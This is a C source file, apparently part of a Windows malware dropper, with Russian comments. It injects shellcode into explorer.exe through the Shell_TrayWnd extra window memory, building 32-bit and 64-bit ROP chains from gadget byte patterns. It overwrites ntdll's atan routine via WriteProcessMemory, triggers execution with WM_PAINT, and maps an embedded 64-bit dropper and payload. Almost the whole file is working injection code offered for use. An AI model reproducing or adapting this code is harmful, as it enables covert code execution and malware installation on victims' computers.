HANDLE eexp_create_notify_inject_event()
{
    char eventName[20];

    fn_lstrcpynA(eventName, utils_get_machine_guid(), RTL_NUMBER_OF(eventName));
    DbgMsg(__FUNCTION__"(): eventName = %s\n", eventName);
    return fn_CreateEventA(NULL, FALSE, FALSE, eventName);
}

BOOLEAN eexp_notify_parent_and_restore_atan()
{
    HANDLE hEvent;
    char eventName[20];

    fn_lstrcpynA(eventName, utils_get_machine_guid(), RTL_NUMBER_OF(eventName));
    DbgMsg(__FUNCTION__"(): eventName = %s\n", eventName);
    hEvent = fn_OpenEventA(EVENT_MODIFY_STATE, FALSE, eventName);
    if (hEvent != NULL) {
        HMODULE newLib;

        fn_SetEvent(hEvent);
        fn_CloseHandle(hEvent);

        newLib = fn_LoadLibraryExA("ntdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (newLib != NULL) {
            PVOID pNewProc = PeGetProcAddress(newLib, "atan", FALSE);
            if (pNewProc != NULL) {
                fn_WriteProcessMemory(NtCurrentProcess(), PeGetProcAddress((PVOID)utils_get_module_base_by_hash(NTDLL_DLL_HASH), "atan", FALSE), pNewProc, 0x200, NULL);
            }

            fn_FreeLibrary(newLib);
        }

        return TRUE;
    }

    return FALSE;
}

#ifndef _WIN64

#include "explorer_sc_x32.c"
#include "explorer_sc_x64.c"

DWORD GetMovEdiEspAddress32()
{
    hde32s hde;
    DWORD i;
    PUCHAR address = (PUCHAR)PeGetProcAddress((PVOID)utils_get_module_base_by_hash(NTDLL_DLL_HASH), "KiUserApcDispatcher", FALSE);
    PVOID Result = address;

    for (i = 0; i < 20; ++i) {
        if (address[0] == 0x58 || (*(PWORD)&address[0] == 0x7C8D && address[2] == 0x24)) {
            Result = address;
            break;
        }

        address = MAKE_PTR(address, hde32_disasm(address, &hde), PUCHAR);
    }

    return (DWORD)Result;
}

BOOLEAN ConfigureShellCodeData32(HANDLE ProcessHandle, pshellcode_data32 CurrentShellCodeData, pshellcode_data32 RemoteShellCodeData, DWORD Length)
{
    UCHAR StdRetBytes[] = {0xFD, 0xC3};
    UCHAR CldRetBytes[] = {0xFC, 0xC3};
    UCHAR PopEaxRetBytes[] = {0x58, 0xC3};
    UCHAR JmpEaxBytes[] = {0xFF, 0xE0};
    UCHAR RepMovsdBytes[] = {0xB9, 0x94, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x5F, 0x33, 0xC0, 0x5E, 0x5D, 0xC2, 0x08, 0x00};

// #ifdef _WIN64
//     __debugbreak();
// #else
//     __asm int 3
// #endif

    do {
        CurrentShellCodeData->NewLongVtable[0] = (DWORD)&RemoteShellCodeData->NewLongVtable[5];

        // Первый колл в еди адресс стека
        CurrentShellCodeData->NewLongVtable[5] = GetMovEdiEspAddress32();
        if (!CurrentShellCodeData->NewLongVtable[5]) {
            DbgMsg(__FUNCTION__"(): GetMovEdiEspAddress: error\n");
            break;
        }

        // Второй колл стек будем писать вверх
        CurrentShellCodeData->NewLongVtable[7] = SearchCodeInProcessModules(ProcessHandle, StdRetBytes, sizeof(StdRetBytes));
        if (!CurrentShellCodeData->NewLongVtable[7]) {
            DbgMsg(__FUNCTION__"(): can't found StdRetBytes\n");
            break;
        }

        // Пишем нашу роп цепочку в стек
        CurrentShellCodeData->NewLongVtable[6] = SearchCodeInProcessModules(ProcessHandle, RepMovsdBytes, sizeof(RepMovsdBytes));
        if (!CurrentShellCodeData->NewLongVtable[6]) {
            DbgMsg(__FUNCTION__"(): can't found RepMovsdBytes\n");
            break;
        }

        // Роп1 Ставим флаг на место
        CurrentShellCodeData->Ret2LibCode[0x19] = SearchCodeInProcessModules(ProcessHandle, CldRetBytes, sizeof(CldRetBytes));
        if (!CurrentShellCodeData->Ret2LibCode[0x19]) {
            DbgMsg(__FUNCTION__"(): can't found CldRetBytes\n");
            break;
        }

        // Ровняем стек куда надо
        CurrentShellCodeData->Ret2LibCode[0x1D] = 0x70;
        CurrentShellCodeData->Ret2LibCode[0x1C] = SearchCodeInProcessModules(ProcessHandle, PopEaxRetBytes, sizeof(PopEaxRetBytes));
        if (!CurrentShellCodeData->Ret2LibCode[0x1C]) {
            DbgMsg(__FUNCTION__"(): can't found PopEaxRetBytes\n");
            break;
        }
        CurrentShellCodeData->Ret2LibCode[0x1E] = (DWORD)PeGetProcAddress((PVOID)utils_get_module_base_by_hash(NTDLL_DLL_HASH), "_chkstk", FALSE);

        // Пишем в атан че надо
        CurrentShellCodeData->Ret2LibCode[0x5] = (DWORD)-1;
        CurrentShellCodeData->Ret2LibCode[0x6] = (DWORD)PeGetProcAddress((PVOID)utils_get_module_base_by_hash(NTDLL_DLL_HASH), "atan", FALSE);
        CurrentShellCodeData->Ret2LibCode[0x7] = (DWORD)RemoteShellCodeData->trueShellCode;
        CurrentShellCodeData->Ret2LibCode[0x8] = (DWORD)Length;
        CurrentShellCodeData->Ret2LibCode[0x9] = (DWORD)&RemoteShellCodeData->Ret2LibCode[0xC];
        CurrentShellCodeData->Ret2LibCode[0x1F] = (DWORD)fn_WriteProcessMemory;

        // Готовим переход на атан
        CurrentShellCodeData->Ret2LibCode[0xE] = (DWORD)&RemoteShellCodeData->injectData;
        CurrentShellCodeData->Ret2LibCode[0xA] = CurrentShellCodeData->Ret2LibCode[0x6];
        CurrentShellCodeData->Ret2LibCode[0x4] = CurrentShellCodeData->Ret2LibCode[0x1C];

        // Прыгаем
        CurrentShellCodeData->Ret2LibCode[0xB] = SearchCodeInProcessModules(ProcessHandle, JmpEaxBytes, sizeof(JmpEaxBytes));
        if (!CurrentShellCodeData->Ret2LibCode[0xB]) {
            DbgMsg(__FUNCTION__"(): can't found JmpEaxBytes\n");
            break;
        }

        return TRUE;
    } while (FALSE);

    return FALSE;
}

PVOID eexp_create_remote_shellcode32(PVOID currentShellCodeData, DWORD length, DWORD trueShellCodeSize)
{
    PVOID result = NULL;
    pshellcode_data32 remoteShellCodeData;
    DWORD processes[10];
    DWORD i;
    DWORD count;

    count = GetProcessIdByName("explorer.exe", processes, RTL_NUMBER_OF(processes));
    for (i = 0; i < count; ++i) {
        HANDLE explorerHandle = fn_OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, processes[i]);
        if (explorerHandle != NULL) {
            remoteShellCodeData = (pshellcode_data32)SearchBytesInProcessMemory(explorerHandle, currentShellCodeData, length);
            if (remoteShellCodeData) {
                if (ConfigureShellCodeData32(explorerHandle, (pshellcode_data32)currentShellCodeData, remoteShellCodeData, trueShellCodeSize)) {
                    result = remoteShellCodeData;
                }

                fn_CloseHandle(explorerHandle);
                break;
            }

            fn_CloseHandle(explorerHandle);
        }
    }

    return result;
}

BOOLEAN eexp_get_work_section32(HANDLE* pSectionHandle, PVOID* pBaseAddress, DWORD_PTR* pViewSize)
{
    DWORD i;
    const wchar_t* sectionNames[] = 
    {
        L"\\BaseNamedObjects\\windows_shell_global_counters",
        L"\\BaseNamedObjects\\ShimSharedMemory",
        L"\\BaseNamedObjects\\MSCTF.Shared.SFM.MIH",
        L"\\BaseNamedObjects\\MSCTF.Shared.SFM.AMF",
        L"\\BaseNamedObjects\\UrlZonesSM_Administrator"
    };

    for (i = 0; i < RTL_NUMBER_OF(sectionNames); ++i) {
        if (NT_SUCCESS(utils_map_section(sectionNames[i], pSectionHandle, pBaseAddress, pViewSize))) {
            MEMORY_BASIC_INFORMATION mbi;
            if (fn_VirtualQuery(*pBaseAddress, &mbi, sizeof(mbi))) {
                *pViewSize = mbi.RegionSize;
            }
            return TRUE;
        }
    }

    return FALSE;
}

BOOLEAN eexp_inject32()
{
    BOOLEAN bRet = FALSE;
    HANDLE sectionHandle;
    PVOID baseAddress;
    DWORD_PTR viewSize = 0;
    HANDLE hSection;
    HANDLE hEvent;

    if (eexp_get_work_section32(&sectionHandle, &baseAddress, &viewSize)) {
        pshellcode_data32 remoteShellCodeData;
        DWORD length;
        pshellcode_data32 pCurrentShellCodeData;

        length = sizeof(shellcode_data32) + sizeof(explorer_sc_x32) + 12 + (8 - (sizeof(explorer_sc_x32) % 8));
        pCurrentShellCodeData = MAKE_PTR(baseAddress, viewSize - length, pshellcode_data32);
        __stosb((uint8_t*)pCurrentShellCodeData, 0, length);
        __movsb(pCurrentShellCodeData->trueShellCode, explorer_sc_x32, sizeof(explorer_sc_x32));

        *(PDWORD)&pCurrentShellCodeData->injectData._CloseHandle = (DWORD)fn_CloseHandle; 
        *(PDWORD)&pCurrentShellCodeData->injectData._MapViewOfFile = (DWORD)fn_MapViewOfFile; 
        *(PDWORD)&pCurrentShellCodeData->injectData._OpenFileMapping = (DWORD)fn_OpenFileMappingA; 
        *(PDWORD)&pCurrentShellCodeData->injectData._CreateThread = (DWORD)fn_CreateThread; 
        *(PDWORD)&pCurrentShellCodeData->injectData._SetWindowLong = (DWORD)fn_SetWindowLongA; 

        remoteShellCodeData = (pshellcode_data32)eexp_create_remote_shellcode32(pCurrentShellCodeData, length, sizeof(explorer_sc_x32));
        if (remoteShellCodeData != NULL) {
            HWND hWnd = fn_FindWindowA("Shell_TrayWnd", NULL);
            DWORD oldLong = fn_GetWindowLongA(hWnd, 0);

            if (hWnd != NULL && oldLong) {
                pCurrentShellCodeData->injectData.lock = FALSE;
                pCurrentShellCodeData->injectData.hWnd = hWnd;
                pCurrentShellCodeData->injectData.oldLongVtable = oldLong;
                pCurrentShellCodeData->injectData.injectEntry = zmodule_get_export(globalData.currentImageBase, 1, 1);//PeGetProcAddress(globalData.currentImageBase, "icmnf", TRUE);
                __movsb((uint8_t*)&pCurrentShellCodeData->injectData.pi, (uint8_t*)&payloadInfo, sizeof(payload_info_t));
                pCurrentShellCodeData->injectData.piEntry = zmodule_get_export(globalData.currentImageBase, 3, 1);//PeGetProcAddress(globalData.currentImageBase, "payloadInfo", TRUE);

                fn_lstrcpynA(pCurrentShellCodeData->injectData.mappingName, utils_get_machine_guid(), RTL_NUMBER_OF(pCurrentShellCodeData->injectData.mappingName));
                if (utils_create_zmodule_mapping(pCurrentShellCodeData->injectData.mappingName, globalData.currentImageBase, globalData.currentImageSize, &hSection, TRUE)) {
                    if (hEvent = eexp_create_notify_inject_event()) {
                        fn_SetWindowLongA(hWnd, 0, (LONG)remoteShellCodeData->NewLongVtable);
                        fn_SendNotifyMessageA(hWnd, WM_PAINT, 0, 0);

                        if (fn_WaitForSingleObject(hEvent, 110 * 1000) == WAIT_OBJECT_0) {
                            DbgMsg(__FUNCTION__"(): Injected ok\n");

                            bRet = TRUE;
                        }
                        fn_CloseHandle(hEvent);
                    }
                    fn_CloseHandle(hSection);
                }
            }
        }

        fn_ZwUnmapViewOfSection(NtCurrentProcess(), baseAddress);
        fn_ZwClose(sectionHandle);
    }

    return bRet;
}

BOOLEAN ConfigureShellCodeData64(HANDLE ProcessHandle, pshellcode_data64 CurrentShellCodeData, DWORD64 RemoteShellCodeData, DWORD Length)
{
    UCHAR RetBytes[] = {0xC3};
    UCHAR SubRspMovsdBytes[] = {0x48, 0x83, 0xec, 0x30, 0x4c, 0x8b, 0xc4, 0x48, 0x81, 0xec, 0xd0, 0x04, 0x00, 0x00, 0x48, 0x8b, 0xf1, 0x48, 0x8b, 0xfc, 0xb9, 0x9a, 0x00, 0x00, 0x00, 0xf3, 0x48, 0xa5};
    UCHAR AddRspRetBytes[] = {0x48, 0x83, 0xc4, 0x58, 0xC3};
    UCHAR PopRcxRetBytes[] = {0x59, 0xC3};
    UCHAR PopRdxRetBytes[] = {0x5A, 0xC3};
    UCHAR PopR8RetBytes[] = {0x41, 0x58, 0xC3};
    UCHAR PopRaxRetBytes[] = {0x58, 0xC3};
    UCHAR MovqXmmBytes[] = {0x4c, 0x8b, 0x4c, 0x24, 0x18, 0xf3, 0x0f, 0x7e, 0x5c, 0x24, 0x18, 0xff, 0xd0};
    UCHAR JmpRdxBytes[] = {0xFF, 0xE2};

    do {
        CurrentShellCodeData->NewLongVtable[0] = (DWORD64)RemoteShellCodeData + FIELD_OFFSET(shellcode_data64, NewLongVtable[5]);

        // Первый колл рет
        CurrentShellCodeData->NewLongVtable[5] = SearchCodeInProcessModules64(ProcessHandle, RetBytes, sizeof(RetBytes));
        if (!CurrentShellCodeData->NewLongVtable[5]) {
            break;
        }

        // Воторой колл рет
        CurrentShellCodeData->NewLongVtable[7] = CurrentShellCodeData->NewLongVtable[5];
        if (!CurrentShellCodeData->NewLongVtable[7]) {
            break;
        }

        // Третий колл записываем в стек нашу цепочку
        CurrentShellCodeData->NewLongVtable[6] = SearchCodeInProcessModules64(ProcessHandle, SubRspMovsdBytes, sizeof(SubRspMovsdBytes));
        if (!CurrentShellCodeData->NewLongVtable[6]) {
            DbgMsg(__FUNCTION__"(): can't found SubRspMovsdBytes\n");
            break;
        }

        // Роп1 - Добавляем к есп байты
        CurrentShellCodeData->d.Ret2LibCode[1] = SearchCodeInProcessModules64(ProcessHandle, AddRspRetBytes, sizeof(AddRspRetBytes));
        if (!CurrentShellCodeData->d.Ret2LibCode[1]) {
            DbgMsg(__FUNCTION__"(): can't found AddRspRetBytes\n");
            break;
        }

        // Роп2 - Достаем рцх параметр1 хпроцесс -1
        CurrentShellCodeData->d.Ret2LibCode[2] = SearchCodeInProcessModules64(ProcessHandle, PopRcxRetBytes, sizeof(PopRcxRetBytes));
        if (!CurrentShellCodeData->d.Ret2LibCode[2]) {
            DbgMsg(__FUNCTION__"(): can't found PopRcxRetBytes\n");
            break;
        }
        CurrentShellCodeData->d.Ret2LibCode[3] = -1;

        // Роп3 - Достаем рдх параметр2 куда писать атан
        CurrentShellCodeData->d.Ret2LibCode[4] = SearchCodeInProcessModules64(ProcessHandle, PopRdxRetBytes, sizeof(PopRdxRetBytes));
        if (!CurrentShellCodeData->d.Ret2LibCode[4]) {
            DbgMsg(__FUNCTION__"(): can't found PopRdxRetBytes\n");
            break;
        }
        CurrentShellCodeData->d.Ret2LibCode[5] = GetRemoteProcAddress64(ProcessHandle, L"ntdll.dll", "atan");

        // Роп4 - Достаем р8 параметр3 откуда писать
        CurrentShellCodeData->d.Ret2LibCode[6] = SearchCodeInProcessModules64(ProcessHandle, PopR8RetBytes, sizeof(PopR8RetBytes));
        if (!CurrentShellCodeData->d.Ret2LibCode[6]) {
            DbgMsg(__FUNCTION__"(): can't found PopR8RetBytes\n");
            break;
        }
        CurrentShellCodeData->d.Ret2LibCode[7] = (DWORD64)RemoteShellCodeData + FIELD_OFFSET(shellcode_data64, d.u.trueShellCode[0]);

        // Роп5 - Достаем в ракс адрес доставалки в ракс потом пригодится
        CurrentShellCodeData->d.Ret2LibCode[8] = SearchCodeInProcessModules64(ProcessHandle, PopRaxRetBytes, sizeof(PopRaxRetBytes));
        if (!CurrentShellCodeData->d.Ret2LibCode[8]) {
            DbgMsg(__FUNCTION__"(): can't found PopRaxRetBytes\n");
            break;
        }
        CurrentShellCodeData->d.Ret2LibCode[9] = CurrentShellCodeData->d.Ret2LibCode[8];

        // Роп6 - Достаем в р9 параметр4 - сколько писать и ретернбайты = 0
        CurrentShellCodeData->d.Ret2LibCode[10] = SearchCodeInProcessModules64(ProcessHandle, MovqXmmBytes, sizeof(MovqXmmBytes));
        if (!CurrentShellCodeData->d.Ret2LibCode[10]) {
            DbgMsg(__FUNCTION__"(): can't found MovqXmmBytes\n");
            break;
        }
        CurrentShellCodeData->d.Ret2LibCode[14] = (DWORD64)ALIGN_UP(Length + 8, 0x20);
        CurrentShellCodeData->d.Ret2LibCode[17] = 0;

        // Там сработает доставалка в ракс и потом будет рет на запись в память
        CurrentShellCodeData->d.Ret2LibCode[11] = GetRemoteProcAddress64(ProcessHandle, L"kernel32.dll", "WriteProcessMemory");

        // Добавляем к есп байтики что бы все было норм
        CurrentShellCodeData->d.Ret2LibCode[12] = CurrentShellCodeData->d.Ret2LibCode[1];

        // Достаем рцх параметры для шеллкода
        CurrentShellCodeData->d.Ret2LibCode[24] = CurrentShellCodeData->d.Ret2LibCode[2];
        CurrentShellCodeData->d.Ret2LibCode[25] = (DWORD64)RemoteShellCodeData + FIELD_OFFSET(shellcode_data64, d.u.injectData);

        // Достаем рдх куда будем прыгать на атан
        CurrentShellCodeData->d.Ret2LibCode[26] = CurrentShellCodeData->d.Ret2LibCode[4];
        CurrentShellCodeData->d.Ret2LibCode[27] = CurrentShellCodeData->d.Ret2LibCode[5];

        // Прыгаем
        CurrentShellCodeData->d.Ret2LibCode[28] = SearchCodeInProcessModules64(ProcessHandle, JmpRdxBytes, sizeof(JmpRdxBytes));
        if (!CurrentShellCodeData->d.Ret2LibCode[28]) {
            DbgMsg(__FUNCTION__"(): can't found JmpRdxBytes\n");
            break;
        }

        // Куда вернемся после шеллкода в конце шеллкода где выровняем стек и продолжим норм
        CurrentShellCodeData->d.Ret2LibCode[29] = CurrentShellCodeData->d.Ret2LibCode[5] + Length;

        return TRUE;
    } while(FALSE);

    return FALSE;
}

DWORD64 eexp_create_remote_shellcode64(pshellcode_data64 pCurrentShellCodeData, DWORD Length, DWORD trueShellCodeSize)
{
    DWORD64 result = 0;
    DWORD processes[10];
    DWORD i;
    DWORD count;

    count = GetProcessIdByName("explorer.exe", processes, RTL_NUMBER_OF(processes));
    for (i = 0; i < count; ++i) {
        HANDLE explorerHandle = fn_OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, processes[i]);
        if (explorerHandle != NULL) {
            DWORD64 remoteShellCodeData;

            *(PDWORD64)&pCurrentShellCodeData->d.u.injectData._SetWindowLongPtr.Addr = GetRemoteProcAddress64(explorerHandle, L"user32.dll", "SetWindowLongPtrA");
            *(PDWORD64)&pCurrentShellCodeData->d.u.injectData._OpenFileMapping.Addr = GetRemoteProcAddress64(explorerHandle, L"kernel32.dll", "OpenFileMappingA");
            *(PDWORD64)&pCurrentShellCodeData->d.u.injectData._MapViewOfFile.Addr = GetRemoteProcAddress64(explorerHandle, L"kernel32.dll", "MapViewOfFile");
            *(PDWORD64)&pCurrentShellCodeData->d.u.injectData._CloseHandle.Addr = GetRemoteProcAddress64(explorerHandle, L"kernel32.dll", "CloseHandle");
            *(PDWORD64)&pCurrentShellCodeData->d.u.injectData._CreateThread.Addr = GetRemoteProcAddress64(explorerHandle, L"kernel32.dll", "CreateThread");

            remoteShellCodeData = SearchBytesInProcessMemory64(explorerHandle, pCurrentShellCodeData, Length);
            if (remoteShellCodeData) {
                if (ConfigureShellCodeData64(explorerHandle, pCurrentShellCodeData, remoteShellCodeData, trueShellCodeSize)) {
                    result = remoteShellCodeData;
                }

                break;
            }

            fn_CloseHandle(explorerHandle);
        }
    }

    return result;
}

#include "dropper64.h"

BOOLEAN eexp_inject64()
{
    BOOLEAN bRet = FALSE;
    HANDLE sectionHandle;
    PVOID baseAddress;
    DWORD_PTR viewSize;
    uint8_t* image64Base;
    uint32_t image64Size;
    HANDLE hSection;
    HANDLE hEvent;

    if (eexp_get_work_section32(&sectionHandle, &baseAddress, &viewSize)) {
        image64Base = zmodule_load_sections(dropper64_bin, &image64Size, PAGE_READWRITE);
        if (image64Base != NULL) {
            uint8_t goodRetBytes[] = {0x48, 0x81, 0xc4, 0xd0, 0x03, 0x00, 0x00, 0xC3};
            DWORD64 remoteShellCodeData;
            DWORD length;
            pshellcode_data64 currentShellCodeData;

            length = sizeof(shellcode_data64) + sizeof(explorer_sc_x64) + 12 + (8 - (sizeof(explorer_sc_x64) % 8));
            currentShellCodeData = MAKE_PTR(baseAddress, viewSize - length, pshellcode_data64);
            __stosb((uint8_t*)currentShellCodeData, 0, length);
            __movsb(currentShellCodeData->d.u.trueShellCode, (const uint8_t*)explorer_sc_x64, sizeof(explorer_sc_x64));
            // Ровняет стек после того как отработает весь наш РОП
            __movsb((uint8_t*)&currentShellCodeData->d.u.trueShellCode[sizeof(explorer_sc_x64)], goodRetBytes, sizeof(goodRetBytes));

            remoteShellCodeData = eexp_create_remote_shellcode64(currentShellCodeData, length, sizeof(explorer_sc_x64));
            if (remoteShellCodeData) {
                HWND hWnd = fn_FindWindowA("Shell_TrayWnd", NULL);
                DWORD oldLong = fn_GetWindowLongA(hWnd, 0);

                if (hWnd && oldLong) {
                    currentShellCodeData->d.u.injectData.lock = FALSE;
                    currentShellCodeData->d.u.injectData.hWnd = (uint64_t)hWnd;
                    currentShellCodeData->d.u.injectData.oldLongVtable = (DWORD64)oldLong;
                    currentShellCodeData->d.u.injectData.injectEntry = (uint64_t)zmodule_get_export(image64Base, 1, 1);// PeGetProcAddress(image64Base, "icmnf", TRUE);
                    __movsb((uint8_t*)&currentShellCodeData->d.u.injectData.pi, (uint8_t*)&payloadInfo, sizeof(payload_info_t));
                    currentShellCodeData->d.u.injectData.piEntry = (uint64_t)zmodule_get_export(image64Base, 3, 1);//PeGetProcAddress(image64Base, "payloadInfo", TRUE);

                    fn_lstrcpynA(currentShellCodeData->d.u.injectData.mappingName, utils_get_machine_guid(), RTL_NUMBER_OF(currentShellCodeData->d.u.injectData.mappingName));

                    if (utils_create_zmodule_mapping(currentShellCodeData->d.u.injectData.mappingName, image64Base, image64Size, &hSection, FALSE)) {
                        if (hEvent = eexp_create_notify_inject_event()) {
// #ifdef _WIN64
//                             __debugbreak();
// #else
//                             __asm int 3
// #endif
                            fn_SetWindowLongA(hWnd, 0, (LONG)(remoteShellCodeData + FIELD_OFFSET(shellcode_data64, NewLongVtable)));
                            fn_SendNotifyMessageA(hWnd, WM_PAINT, 0, 0);
                            if (fn_WaitForSingleObject(hEvent, 110 * 1000) == WAIT_OBJECT_0) {
                                DbgMsg(__FUNCTION__": Injected ok\n");
                                bRet = TRUE;
                            }
                            fn_CloseHandle(hEvent);
                        }
                        fn_CloseHandle(hSection);
                    }
                }
            }
            fn_VirtualFree(image64Base, 0, MEM_RELEASE);
        }
        fn_ZwUnmapViewOfSection(NtCurrentProcess(), baseAddress);
        fn_ZwClose(sectionHandle);
    }

    return bRet;
}

#endif
